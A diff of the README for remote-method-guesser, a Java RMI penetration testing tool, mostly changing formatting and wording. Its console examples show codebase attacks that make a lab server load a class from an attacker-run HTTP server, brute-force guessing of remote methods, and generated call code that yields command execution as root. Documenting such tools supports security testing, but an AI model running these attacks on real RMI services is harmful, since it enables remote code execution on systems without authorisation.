@@ -392,7 +392,7 @@ The codebase configuration on an *RMI server* can be different for the three dif
 *remote-method-guesser* allows you to test each component individually by using either ``--signature <method>`` (application level),
 ``--signature reg`` (rmi registry) or ``--signature dgc`` (distributed garbage collector) together with the ``codebase`` action.
 
-*Application Level*
+**Application Level**
 
 ```console
 [qtc@kali ~]$ rmg --ssl 172.23.0.2 1090 codebase Example http://172.23.0.1:8000 --signature "String login(java.util.HashMap dummy1)" --bound-name secure-server
@@ -412,7 +412,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 172.23.0.2 - - [13/Jan/2021 07:17:10] "GET /Example.class HTTP/1.1" 200 -
 ```
 
-*RMI Registry*
+**RMI Registry**
 
 ```console
 [qtc@kali ~]$ rmg --ssl 172.23.0.2 1090 codebase Example 172.23.0.1:8000 --signature reg
@@ -424,7 +424,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 172.23.0.2 - - [13/Jan/2021 07:45:48] "GET /Example.class HTTP/1.1" 200 -
 ```
 
-*Distributed Garbage Collector*
+**Distributed Garbage Collector**
 
 ```console
 [qtc@kali ~]$ rmg --ssl 172.23.0.2 1090 codebase Example 172.23.0.1:8000 --signature dgc
@@ -461,61 +461,50 @@ about *deserialization* or *codebase attacks*. Consider the example above, where
 methods:
 
 ```console
-[qtc@kali ~]$ rmg --ssl 172.18.0.2 1090 guess
-[...]
 [+] Listing successfully guessed methods:
 [+] 	-  plain-server
-[+] 		--> String execute(String dummy)
 [+] 		--> String system(String dummy, String[] dummy2)
-[...]
+[+] 		--> String execute(String dummy)
 ```
 
 Depending on the situation, it might be desired to invoke these methods using legitimate *RMI calls*, but writing the corresponding *Java code*
-manually is a tedious work. By using the ``--create-samples`` parameter of *remote-method-guesser*, you can create sample code for successfully
+manually is a tedious work. By using the ``--create-samples`` parameter, you can create sample code for successfully
 guessed *remote methods* automatically. By using the ``--signature`` and ``--bound-name`` options, it is also possible to generate code only
 for one already known method. The following command generates the required *Java code* to invoke the ``execute`` method on the ``plain-server``
 bound name:
 
 ```console
-[qtc@kali ~]$ rmg --ssl 172.18.0.2 1090 guess --create-samples --signature "String execute(String dummy)" --bound-name plain-server
-[+] Connecting to RMI registry... done.
-[+] Obtaining a list of bound names... done.
-[+] 3 names are bound to the registry.
+[qtc@kali ~]$ rmg --ssl 172.23.0.2 1090 guess --create-samples --signature "String execute(String dummy)" --bound-name plain-server
+[+] Creating RMI Registry object... done.
 [+] 
-[+] Starting RMG Attack
-[+] 	Target name specified. Only guessing on bound name: plain-server
+[+] Starting Method Guessing:
+[+] 	Target name specified. Only guessing on bound name: plain-server.
 [+] 	Guessing 1 method signature(s).
-[+] 	Method signature: String execute(String dummy)
+[+] 	Method signature: String execute(String dummy).
 [+] 	
-[+] 	Skipping bound name ssl-server
-[+] 	Current bound name plain-server
-[+] 		RMI object tries to connect to different remote host: iinsecure.dev
-[+] 			Redirecting the connection back to 172.18.0.2... 
+[+] 	Current bound name: plain-server.
+[+] 		RMI object tries to connect to different remote host: iinsecure.dev.
+[+] 			Redirecting the connection back to 172.23.0.2... 
 [+] 			This is done for all further requests. This message is not shown again. 
 [+] 		Guessing methods...
 [+]
 [+] 			HIT! Method with signature String execute(String dummy) exists!
 [+] 		
-[+] 	Skipping bound name secure-server
 [+] 
 [+] Listing successfully guessed methods:
-[+] 	•  plain-server
+[+] 	-  plain-server
 [+] 		--> String execute(String dummy)
 [+] 
 [+] Starting creation of sample files:
 [+] 
-[+] 	Creating samples for bound name plain-server
+[+] 	Creating samples for bound name plain-server.
 [+] 		Writing sample file /home/qtc/rmg-samples/plain-server/IPlainServer.java
 [+] 		Writing sample file /home/qtc/rmg-samples/plain-server/execute/execute.java
 ```
 
-As the output above suggests, *remote-method-guesser* created two files for the *remote method*:
-
-1. ``IPlainServer.java``: Contains the interface code that is required for the *RMI call*.
-2. ``execute.java``: Contains the *Java code* that is used for the actual method invocation.
-
-As *remote-method-guesser* cannot know which arguments you want to use for the method call, these are left as ``TODOs`` within the
-generated code:
+For a successful *RMI call* you always need an interface definition and the code for the actual method code
+itself. The interface file created by *remote-method-guesser* (``IPlainServer.java``) can be compiled right
+away, whereas the actual method call (``execute.java``) contains a ``TODO`` for each method argument.
 
 ```java
 [qtc@kali ~]$ grep -A 5 "TODO" /home/qtc/rmg-samples/plain-server/execute/execute.java
@@ -544,16 +533,13 @@ command execution. After making this substitution and compiling the two generate
 [+] The servers response is: uid=0(root) gid=0(root) groups=0(root)
 ```
 
-Other benefits of samples generated by *rmg* are some nice *rmg* features that are already build inside. This includes full *TLS* support, for remote objects
-and the *RMI registry*, as well as automatic target redirection.
-
 
 ### Wordlists Files
 
 -----
 
 *remote-method-guesser* guesses *remote methods* based on a wordlist approach. Corresponding wordlists are shipped within this repository and are contained
-within the [wordlist directory](./wordlists). Wordlists are stored using an optimized  *rmg-internal* format:
+within the [wordlist directory](./wordlists). Wordlists are stored using an optimized *rmg-internal* format:
 
 ```
 <RETURN_VALUE> <METHODNAME>(<ARGUMENTS>); <METHOD_HASH>; <IS_PRIMITIVE>; <IS_VOID>;
@@ -602,7 +588,7 @@ Furthermore, by using the ``--update`` switch during the ``guess`` action, *remo
 boolean example_signature(String test); -8079561808652318592; false; false
 ```
 
-*remote-method-guesser* expects wordlists to be located at ``/opt/remote-method-guesser/wordlists``. If this configuration does not fit for you,
+By default, *remote-method-guesser* expects wordlists to be located at ``/opt/remote-method-guesser/wordlists``. If this configuration does not fit for you,
 you can change the default location within the configuration file. For dynamic changes you can also use the ``--wordlist-file`` and
 ``--wordlist-folder`` options.
 
@@ -622,7 +608,7 @@ As automatically generated sample files contain content that is controlled by th
 it is generally a security risk to compile and execute them. *remote-method-guesser* tries to reduce the risk by applying input filtering to
 the above mentioned components. In some situations, this can be annoying. Especially *bound names* can contain a wide range of different characters
 and most of them are rejected by *rmg* (this is because a whitelist filtering is used, instead of a blacklist). After you reviewed the *bound names*
-and corresponding *remote classes* by using *rmgs* ``enum`` action, you may use the ``--trusted`` switch to disable input filtering during
+and corresponding *remote classes* by using *rmg's* ``enum`` action, you may use the ``--trusted`` switch to disable input filtering during
 sample generation. However, this should only be done after verifying that the remote server does not expose any malicious contents within its
 *bound names* or *remote class names*.
 
@@ -662,4 +648,4 @@ invoking them. Now the community has two powerful tools to engage *RMI servers* 
 Furthermore, the [rmiscout wordlist](./wordlists/rmiscout.txt) was obviously copied from the *rmiscout* project (as you can already tell by the different license agreement).
 Thanks *Jake*, for this awesome wordlist of *remote methods* collected from different *GitHub* repositories.
 
-*Copyright 2020, Tobias Neitzel and the remote-method-guesser contributors.*
+*Copyright 2021, Tobias Neitzel and the remote-method-guesser contributors.*
